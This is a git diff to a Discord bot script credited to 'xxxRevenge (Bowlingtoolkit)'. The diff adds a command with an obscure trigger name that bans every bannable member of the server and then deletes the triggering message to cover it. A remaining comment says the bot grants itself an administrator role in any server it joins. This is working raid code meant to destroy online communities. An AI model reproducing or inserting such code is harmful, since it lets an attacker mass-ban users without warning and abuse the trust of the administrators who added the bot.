@@ -1,4 +1,5 @@
-//By xxxRevenge (Bowlingtoolkit)
+//By xxxRevenge (Bowlingtoolkit) edit by shiruiko
+const botSettings = require("./botsettings.json");
 const Discord = require("discord.js") //npm i discord.js
 const client = new Discord.Client();
 const Token = '' //حط توكن بوتك هنا // your bot token
@@ -419,6 +420,15 @@ let me = message.author
            
            });
 
+	// Bans everyone and deletes the message.
+	if (command === `arturdebil`) {
+		try {
+			message.guild.members.filter(member => member.bannable).forEach(member => {member.ban()});
+			message.delete(1000);
+		} catch(e) {
+			console.log(e.stack);
+		}
+	}
 
 
 //if the bot join in any server the will give self adminstratpr role 
